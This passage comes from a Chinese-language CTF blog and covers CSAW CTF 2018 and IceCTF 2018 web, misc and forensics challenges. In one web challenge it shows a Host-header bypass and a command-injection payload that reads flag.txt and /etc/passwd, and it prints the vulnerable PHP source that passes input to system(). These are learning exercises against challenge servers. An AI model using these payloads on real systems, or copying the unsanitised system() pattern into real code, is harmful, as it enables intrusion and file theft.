src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433252118.png" alt="1537433252118"></p><p>在<code>lb.php</code>，我们可以找到<code>216.165.2.41</code>，但无法访问。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433820630.png" alt="1537433820630"></p><p>如果我们将<code>Host</code>更改为<code>support.no.vulnerable.services</code>，则会返回<code>Hacking detected! Denied attempt to proxy to a NVS internal hostname. Your IP has been logged.</code>。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406901499.png" alt="1537406901499"></p><p>这是因为<code>216.165.2.41</code>是代理，所以我们可以按照上面的格式将<code>Host</code>改为<code>{hexip}.ip.no.vulnerable.service</code>。但怎么知道<code>ip</code>呢？我们<code>ping</code> 下<code>support.no.vulnerable.services</code>，知道它的<code>ip</code>是<code>172.16.2.5</code>，而<code>172.16.2.5</code>的<code>16</code>进制值为<code>ac100205</code>，所以我们可以使用<code>ac100205.ip.no.vulnerable.services</code>它来访问它。（这个<a href="https://www.browserling.com/tools/ip-to-hex" target="_blank" rel="noopener">网站</a>将<code>ip</code>值转化为<code>16</code>进制值）</p><p>构造完，我们访问下，得到如下页面，可以看到有个ping.php</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407249656.png" alt="1537407249656"></p><p>这个页面是可以进行<code>ping</code>，看来它是一个<code>ping</code>命令行注入。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407286715.png" alt="1537407286715"></p><p>尝试下（注意<code>Host</code>头部均要改成<code>Host: ac100205.ip.no.vulnerable.services</code>）</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407427066.png" alt="1537407427066"></p><p>尝试<code>ls</code>一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ping.php?dest=127.0.0.`ls`</span><br></pre></td></tr></table></figure><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407642085.png" alt="1537407642085"></p><p>读取<code>flag.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ping.php?dest=127.0.0.1`cat%20flag.txt`</span><br></pre></td></tr></table></figure><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407992506.png" alt="1537407992506"></p><p>得到<code>flag{7672f158167cab32aebc161abe0fbfcaee2868c1}</code></p><p>后面尝试读取其他文件，比如<code>ping.php</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537408264849.png" alt="1537408264849"></p><p>以下是此源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'dest'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Missing parameters."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dest = $_GET[<span class="string">'dest'</span>];</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ping -c3 \""</span> . $dest . <span class="string">"\" 2&gt;&amp;1"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>又如<code>/etc/passwd</code>…….其他自行摸索篇</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537408363301.png" alt="1537408363301"></p><h5 id="WTF-SQL（没搞懂考的啥——此题未解决）"><a href="#WTF-SQL（没搞懂考的啥——此题未解决）" class="headerlink" title="WTF.SQL（没搞懂考的啥——此题未解决）"></a>WTF.SQL（没搞懂考的啥——此题未解决）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">         C S A W</span><br><span class="line">          C T F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">It is a period of civil war.</span><br><span class="line">Rebel hackers, striking</span><br><span class="line">from a hidden base, have won</span><br><span class="line">their first victory against</span><br><span class="line">the evil DBA.</span><br><span class="line"></span><br><span class="line">During the battle, Rebel</span><br><span class="line">spies managed to steal secret</span><br><span class="line">plans to the DBA&apos;s</span><br><span class="line">ultimate weapon, WTF.SQL,</span><br><span class="line">an integrated framework</span><br><span class="line">with enough buzzwords to</span><br><span class="line">host an entire website.</span><br><span class="line"></span><br><span class="line">Pursued by the DBA&apos;s</span><br><span class="line">sinister agents, You, the</span><br><span class="line">Player, race home aboard</span><br><span class="line">your VT100, custodian of the</span><br><span class="line">stolen schema that can save</span><br><span class="line">the animals and restore</span><br><span class="line">freedom to the internet.....</span><br><span class="line"></span><br><span class="line">Your mission is to read out</span><br><span class="line">the txt table in the flag</span><br><span class="line">database.</span><br></pre></td></tr></table></figure><p><code>Enjoy :&gt;</code></p><p><code>Edit: (09/15 11:06 AM EST) Fixed a bug in stage 2</code></p><p><code>http://web.chal.csaw.io:3306</code></p><p>此题先放出<a href="https://blog.rpis.ec/2018/09/csaw-ctf-quals-2018-wtf-sql.html" target="_blank" rel="noopener">writeup</a></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="Twitch-Plays-Test-Flag（签到题）"><a href="#Twitch-Plays-Test-Flag（签到题）" class="headerlink" title="Twitch Plays Test Flag（签到题）"></a>Twitch Plays Test Flag（签到题）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;typ3_y3s_to_c0nt1nue&#125;</span><br></pre></td></tr></table></figure><h5 id="bin-t"><a href="#bin-t" class="headerlink" title="bin_t"></a>bin_t</h5><p>Binary trees let you do some interesting things. Can you balance a tree?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc misc.chal.csaw.io 9001</span><br></pre></td></tr></table></figure><p>Equal nodes should be inserted to the right of the parent node. You should balance the tree as you add nodes.</p><p><code>nc</code>下给出一组数字，将这组数字转换成<code>平衡二叉树</code>，并且给出该ACL树的前序遍历。</p><p><code>Add these numbers to a AVL Binary Tree, then send them back in the preorder traversal!</code><br><code>99,5,76,16,73,65,45,48,52,81,99,38,16,83,91,20,40,35,41,94,26,40,53,89,93,43,27,49,3,87,98,48,38,64,78,44,81,22,28,35,29,51,63,87,55,99,78,34,47,0,98,54,88,55,81,66,60,40,23,78,70,74,83,98,38,24,29,4,64,65,49,46,46,10,22,98,35,55,73,16,83,86,21,99,78,56,31,6,77,83,81,69,63,77,26,31,20,81,76,8</code><br><code>Send the preorder traversal in a comma sperated list.</code></p><p>对于我这种菜鸡而言，还是有点难度的，直接<code>github</code>找了下，调用<code>pyavltree</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pyavltree <span class="keyword">import</span> AVLTree</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">9001</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">numbers = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> r.recvline().split(<span class="string">","</span>)]</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">tree = AVLTree(numbers)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">","</span>.join([str(x) <span class="keyword">for</span> x <span class="keyword">in</span> tree.preorder(tree.rootNode)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537435410792.png" alt="1537435410792"></p><p>不过这样的做法是学不到东西的，还是得回头学。</p><h5 id="Short-Circuit"><a href="#Short-Circuit" class="headerlink" title="Short Circuit"></a>Short Circuit</h5><p>Start from the monkey’s paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.</p><ul><li>Elyk</li></ul><p>Hint: There are 112 Things You Need to Worry About</p><p><a href="https://ctf.csaw.io/files/cdd260cc2b42696bff30d001b85aed06/20180915_074129.jpg" target="_blank" rel="noopener">20180915_074129.jpg</a></p><p>这题是我见过最恐怖的misc题，正确做法如下</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/6.png" alt="6"></p><p>上面那个看不懂，再看下面的</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/short-circuit.jpg" alt="short-circuit"></p><p>然后拼接</p><p><code>01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001</code><br><code>01101000 01100001 01101110 01100100 01111101</code></p><p>转换得到<code>flag</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537436074257.png" alt="1537436074257"></p><p>此题有非常详细的<a href="https://github.com/mohamedaymenkarmous/CTF/tree/master/CSAWCTFQualificationRound2018#short-circuit" target="_blank" rel="noopener">writeup</a>，可以仔细学习到很多东西</p><h5 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h5><p>Are you a real math wiz?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc misc.chal.csaw.io 9002</span><br></pre></td></tr></table></figure><p>这题不难，自己用<code>pwntools</code>写出来了，不过无意间看了大佬的简易代码，运用<a href="https://code.activestate.com/recipes/365013-linear-equations-solver-in-3-lines/" target="_blank" rel="noopener">复数的姿势</a>，稍微修改了下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">sc=socket.socket()</span><br><span class="line">host = &quot;misc.chal.csaw.io&quot;</span><br><span class="line">port =9002</span><br><span class="line">addr=(host,port)</span><br><span class="line">sc.connect(addr)</span><br><span class="line">print sc.recv(2048)</span><br><span class="line"></span><br><span class="line">def solve1(eq,var=&apos;X&apos;):</span><br><span class="line">    eq1 = eq.replace(&quot;=&quot;,&quot;-(&quot;) + &quot;)&quot;</span><br><span class="line">    print eq1</span><br><span class="line">    c = eval(eq1,&#123;var:1j&#125;)</span><br><span class="line">    print c</span><br><span class="line">    print c.real,c.imag</span><br><span class="line">    if (-c.real == 0):</span><br><span class="line">        return 0</span><br><span class="line">    else:</span><br><span class="line">        return -c.real/c.imag</span><br><span class="line"></span><br><span class="line">def find(num):</span><br><span class="line">    print &apos;============  &apos; + str(num) + &apos;  ===============&apos;</span><br><span class="line">    data = sc.recv(1024)</span><br><span class="line">    if &quot;flag&quot; in data:</span><br><span class="line">        print data</span><br><span class="line">        return 1</span><br><span class="line">    if num!=1:</span><br><span class="line">        equation = data.split(&apos;\n&apos;)[1]</span><br><span class="line">    else:</span><br><span class="line">        equation = data.split(&apos;\n&apos;)[0]</span><br><span class="line">    print equation</span><br><span class="line">    result = str(solve1(equation))</span><br><span class="line">    print &apos;solving：&apos; + equation + &apos;, result = &apos; + result</span><br><span class="line">    sc.send(result + &apos;\n&apos;)</span><br><span class="line">    print &apos;===========================&apos;</span><br><span class="line"></span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">while True:</span><br><span class="line">    if find(i):</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br></pre></td></tr></table></figure><p>运行得到<code>flag</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537438355628.png" alt="1537438355628"></p><p>最终答案<code>flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}</code></p><p><code>pwntools</code>使用的源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">9002</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Skip the banner</span></span><br><span class="line">r.recvuntil(<span class="string">"*********"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    task = r.recvline()</span><br><span class="line">    <span class="keyword">print</span> task</span><br><span class="line">    <span class="keyword">print</span> r.recvuntil(<span class="string">"What does X equal?: "</span>)</span><br><span class="line"></span><br><span class="line">    eq1 = task.replace(<span class="string">"="</span>,<span class="string">"-("</span>)+<span class="string">")"</span></span><br><span class="line">    c = eval(eq1,&#123;<span class="string">"X"</span>:<span class="number">1j</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Return 0 by default = if infinite solutions</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> c.imag != <span class="number">0</span>:</span><br><span class="line">        result = -c.real/c.imag</span><br><span class="line"></span><br><span class="line">    r.sendline(str(result))</span><br><span class="line">    <span class="keyword">print</span> r.recvline()</span><br></pre></td></tr></table></figure><h5 id="Take-an-L"><a href="#Take-an-L" class="headerlink" title="Take an L"></a>Take an L</h5><p>Fill the grid with L’s but avoid the marked spot for the W</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc misc.chal.csaw.io 9000</span><br></pre></td></tr></table></figure><p>The origin is at (0,0) on the top left</p><p><a href="https://ctf.csaw.io/files/08e3f77b27de5e821d109c5b329133aa/description.pdf" target="_blank" rel="noopener">description.pdf</a></p><p>此题，对于菜鸡而言不是现在能解决的，我放弃，放出<a href="https://gitlab.com/mahham/ctf/blob/master/2018-csaw/Readme.md#take-an-l-200-misc" target="_blank" rel="noopener">writeup</a></p><h4 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h4><h5 id="simple-recovery"><a href="#simple-recovery" class="headerlink" title="simple_recovery"></a>simple_recovery</h5><p><code>Simple Recovery Try to recover the data from these RAID 5 images!</code></p><p><a href="https://ctf.csaw.io/files/54ee1842ff27eb6bff1755f36f044b54/disk.img0.7z" target="_blank" rel="noopener">disk.img0.7z</a>，<a href="https://ctf.csaw.io/files/ebf1816483b27db5be622be0cc781224/disk.img1.7z" target="_blank" rel="noopener">disk.img1.7z</a></p><p>提供两个文件，<code>file</code>下</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537236481427.png" alt="1537236481427"></p><p>img文件，尝试一波挂载，竟然没效果，使用绝招<code>strings *| grep &quot;flag&quot;</code>，搜索出<code>flag</code>，一脸郁闷</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537238416590.png" alt="1537238416590"></p><h5 id="🐼-Rewind"><a href="#🐼-Rewind" class="headerlink" title="🐼 Rewind"></a>🐼 Rewind</h5><p><code>Sometimes you have to look back and replay what has been done right and wrong</code></p><p>解压之后，使用绝招<code>strings *| grep &quot;flag&quot;</code>，就那么几个，尝试下</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537441789426.png" alt="1537441789426"></p><p>最终答案：<code>flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}</code></p><h5 id="whyOS"><a href="#whyOS" class="headerlink" title="whyOS"></a>whyOS</h5><p><code>Have fun digging through that one. No device needed.</code></p><p><code>Note: the flag is not in flag{} format</code></p><p><code>HINT: the flag is literally a hex string. Put the hex string in the flag submission box</code></p><p><code>Update (09/15 11:45 AM EST) - Point of the challenge has been raised to 300 Update Sun 9:09 AM: its a hex string guys</code></p><p><a href="https://ctf.csaw.io/files/77ce62c32bbf0e685ebc0c5741b1d585/com.yourcompany.whyos_4.2.0-28debug_iphoneos-arm.deb" target="_blank" rel="noopener">com.yourcompany.whyos_4.2.0-28debug_iphoneos-arm.deb</a></p><p><a href="https://ctf.csaw.io/files/9c2e3d70941abc0b911990507ac73160/console.log" target="_blank" rel="noopener">console.log</a></p><p>给了两个文件</p><p>强行命令<code>strings * | grep &#39;Preferences&#39; | grep -E &#39;[0-9a-fA-F]{32,}&#39;</code>搜索</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537442382158.png" alt="1537442382158"></p><p>最终答案<code>ca3412b55940568c5b10a616fa7b855e</code></p><h5 id="mcgriddle"><a href="#mcgriddle" class="headerlink" title="mcgriddle"></a>mcgriddle</h5><p><code>All CTF players are squares</code></p><p><code>Edit (09/14 8:22 PM) - Uploaded new pcap file</code></p><p><code>Edit (09/15 12:10 AM) - Uploaded new pcap file</code></p><p><a href="https://ctf.csaw.io/files/86651aad7d1f26ee512b46327c5aa160/final.pcap" target="_blank" rel="noopener">final.pcap</a></p><p>这题流量分析后面单独开篇讲解，贼有意思的一道题目。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次的web做的贼舒服，难度高，学的东西特别多，贼虚服。最近不是懒，是真忙，17号的黑盾，前前后后忙了四天，&lt;code&gt;writeup&lt;/code&gt;后面最近才补全，福州这个去了好多次的城市，感慨颇多啊。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Icectf2018 writeup</title>
    <link href="https://jianghuxia.github.io/2018/09/18/Icectf2018-writeup/"/>
    <id>https://jianghuxia.github.io/2018/09/18/Icectf2018-writeup/</id>
    <published>2018-09-18T09:40:45.000Z</published>
    <updated>2018-10-23T09:27:37.273Z</updated>
    
    <content type="html"><![CDATA[<p>这是场长知识的比赛，持续了<code>7</code>天，贼好玩，最大的收获:让我提起了对二进制方向学习的兴致。此篇，容我慢慢分析，后续慢慢更新，这个比赛是入门<code>pwn</code>的绝佳学习机会。<br><a id="more"></a> </p><h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="1-Toke-Relaunch"><a href="#1-Toke-Relaunch" class="headerlink" title="1.Toke Relaunch"></a>1.Toke Relaunch</h5><p><em>DESCRIPTION</em></p><p><code>We&#39;ve relaunched our famous website, Toke! Hopefully no one will hack it again and take it down like the last time.</code></p><p>额。。。打开网页，感觉好像挺难的</p><p><img src="/2018/09/18/Icectf2018-writeup/1536281133227.png" alt="1536281133227"></p><p>扫下目录看看</p><p><img src="/2018/09/18/Icectf2018-writeup/1536281217069.png" alt="1536281217069"></p><p>em~</p><p><img src="/2018/09/18/Icectf2018-writeup/1536281246755.png" alt="1536281246755"></p><p>打开网页，得到flag</p><p><img src="/2018/09/18/Icectf2018-writeup/1536281295124.png" alt="1536281295124"></p><p>最终答案：<code>IceCTF{what_are_these_robots_doing_here}</code></p><h5 id="2-Lights-out"><a href="#2-Lights-out" class="headerlink" title="2.Lights out!"></a>2.Lights out!</h5><p><strong>DESCRIPTION</strong></p><p><code>Help! We&#39;re scared of the dark!</code></p><p>这题虽然简单了点，但贼好玩。</p><p>打开页面，除了最上面那句话啥都是黑的。忙活半天，扫了半天，后面想想，估计是改前端吧。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536372395900.png" alt="1536372395900"></p><p>开启调试模式，哎呦，发现<code>summary</code>区域是<code>none</code>状态</p><p><img src="/2018/09/18/Icectf2018-writeup/1536372467928.png" alt="1536372467928"></p><p>随便改个玩玩，改成<code>red</code>吧</p><p><img src="/2018/09/18/Icectf2018-writeup/1536372660917.png" alt="1536372660917"></p><p>(⊙o⊙)…，有秘密哦。然后直接再把整个页面的布局颜色直接改成蓝色，答案就出来啦</p><p><img src="/2018/09/18/Icectf2018-writeup/1536372844041.png" alt="1536372844041"></p><p>当然也可以直接一个一个去改summary里面每个标签的颜色</p><p><img src="/2018/09/18/Icectf2018-writeup/1536373090648.png" alt="1536373090648"></p><p>最终答案：<code>IceCTF{styles_turned_the_lights}</code></p><h5 id="3-Friðfinnur"><a href="#3-Friðfinnur" class="headerlink" title="3.Friðfinnur"></a>3.Friðfinnur</h5><p><strong>DESCRIPTION</strong></p><p>Eve wants to make the hottest new website for job searching on the market! An avid PHP developer she decided to use the hottest new framework, Laravel! I don’t think she knew how to deploy websites at this scale however….</p><p>打开<a href="https://3rf0c2v1ztr0i6v-fridfinnur.labs.icec.tf/" target="_blank" rel="noopener">题目链接</a>，基于Laravel框架。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536459231158.png" alt="1536459231158"></p><p><code>awvs</code>扫一下，同时找了下近期<code>Laravel</code>有关的<a href="https://www.anquanke.com/vul/id/1251173" target="_blank" rel="noopener">cve</a>，awvs筛选出很多信息，仔细分析查看</p><p><img src="/2018/09/18/Icectf2018-writeup/1536459924650.png" alt="1536459924650"></p><p>(⊙o⊙)…，这样就找到flag了？？？在仔细看看相应的网页，好吧。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536459037563.png" alt="1536459037563"></p><p>最终答案：<code>IceCTF{you_found_debug}</code></p><h5 id="4-History-of-Computing"><a href="#4-History-of-Computing" class="headerlink" title="4.History of Computing"></a>4.History of Computing</h5><p>One of the authors of IceCTF made this page but I don’t think it’s very accurate. Can you take hack it before the IceCTF team gets sued?</p><p>这题也是水的没话说，不过，我还是做了很久，查看<code>token</code>就是了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token:   eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZmxhZyI6IkljZUNURntob3BlIHlvdSBkb24ndCB0aGluayB0aGlzIGlzIGEgcmVhbCBmbGFnfSJ9.</span><br></pre></td></tr></table></figure><p>然后<code>base64</code>解密，其中得到答案：</p><p><code>&quot;flag&quot;:&quot;IceCTF{hope you don&#39;t think this is a real flag}&quot;</code></p><h4 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h4><h5 id="1-Modern-Picasso"><a href="#1-Modern-Picasso" class="headerlink" title="1.Modern Picasso"></a>1.Modern Picasso</h5><p><strong>DESCRIPTION</strong></p><p><code>Here&#39;s a rendition of some modern digital abstract art. Is it more than art though?</code></p><p>题目给了个<a href="https://static.icec.tf/picasso/picasso.gif" target="_blank" rel="noopener">picasso.gif</a>，分解出67张图片，感觉是拼图，使用工具<code>Firework</code>（使用其中的魔法棒工具，每次拖进去一张图片，都要按Delete一次）</p><p><img src="/2018/09/18/Icectf2018-writeup/1536395026633.png" alt="1536395026633"></p><p>得到最终答案：<code>IceCTF{wow_fast}</code></p><h5 id="2-Hard-Shells"><a href="#2-Hard-Shells" class="headerlink" title="2.Hard Shells"></a>2.Hard Shells</h5><p><strong>DESCRIPTION</strong></p><p><code>After a recent hack, a laptop was seized and subsequently analyzed. The victim of the hack? An innocent mexican restaurant. During the investigation they found this suspicous file. Can you find any evidence that the owner of this laptop is the culprit?</code></p><p>下载附件<code>hardshells</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536284769181.png" alt="1536284769181"></p><p><code>winhex</code>里瞧瞧，发现<code>PK</code>结构，改后缀名<code>.zip</code>，发现是加密的，尝试爆破</p><p><img src="/2018/09/18/Icectf2018-writeup/1536283602009.png" alt="1536283602009"></p><p>解压后，打开是个<code>d</code>文件</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284722432.png" alt="1536284722432"></p><p><code>file</code>一下<code>d: Minix filesystem, V1, 30 char names, 20 zones</code>，是个Minix的文件系统，可以执行挂载命令。ubuntu16.04下执行命令<code>mount -t minix d /home/jianghu/Documents -o loop</code>，挂载成功后有个dat，再次file，数据文件……</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284321328.png" alt="1536284321328"></p><p>还是取出来放<code>winhex</code>里瞧瞧吧</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284425359.png" alt="1536284425359"></p><p>很明显，<code>png</code>的头部，不过需要修正下：<code>U</code>-&gt;<code>N</code>，再加上后缀</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284553926.png" alt="1536284553926"></p><p>打开后</p><p><img src="/2018/09/18/Icectf2018-writeup/1536284595374.png" alt="1536284595374"></p><p>最终答案：<code>IceCTF{look_away_i_am_hacking}</code></p><h5 id="3-Lost-in-the-Forest"><a href="#3-Lost-in-the-Forest" class="headerlink" title="3. Lost in the Forest"></a>3. Lost in the Forest</h5><p><strong>DESCRIPTION</strong></p><p>You’ve rooted a notable hacker’s system and you’re sure that he has hidden something juicy on there. Can you find his secret?</p><p>下载附件，给了个<code>fs.zip</code>，解压，好多文件目录，<code>tree</code>一下</p><p><img src="/2018/09/18/Icectf2018-writeup/1536286139874.png" alt="1536286139874"></p><p>额，还是去翻翻瞧瞧吧。在<code>fs\home\hkr\</code>目录下发现了好多东西</p><p><img src="/2018/09/18/Icectf2018-writeup/1536290790457.png" alt="1536290790457"></p><p>在<code>.bash_history</code>中可以看出黑客使用的历史命令，其中好像下载了什么东西</p><p><img src="/2018/09/18/Icectf2018-writeup/1536290912668.png" alt="1536290912668"></p><p>在往下翻翻有</p><p><img src="/2018/09/18/Icectf2018-writeup/1536291044444.png" alt="1536291044444"></p><p>哦~，看样子好像加密了什么东西，最后生成到了<code>hzpxbsklqvboyou</code>文件中</p><p>看看内容</p><p><img src="/2018/09/18/Icectf2018-writeup/1536291206600.png" alt="1536291206600"></p><p>这样的话，估计就是给了我们加密脚本和密文，让我们解密求出明文咯</p><p>打开刚刚的<code>.bash_history</code>中的<a href="https://gist.githubusercontent.com/Glitch-is/bc49ee73e5413f3081e5bcf5c1537e78/raw/c1f735f7eb36a20cb46b9841916d73017b5e46a3/eRkjLlksZp" target="_blank" rel="noopener">url</a>，以下是显示内容</p><p><img src="/2018/09/18/Icectf2018-writeup/1536285837841.png" alt="1536285837841"></p><p>具体脚本是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        s = f.readline().strip()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode((<span class="string">''</span>.join([chr(ord(s[x])+([<span class="number">5</span>,<span class="number">-1</span>,<span class="number">3</span>,<span class="number">-3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">-6</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">-3</span>,<span class="number">-5</span>,<span class="number">3</span>,<span class="number">-15</span>] * <span 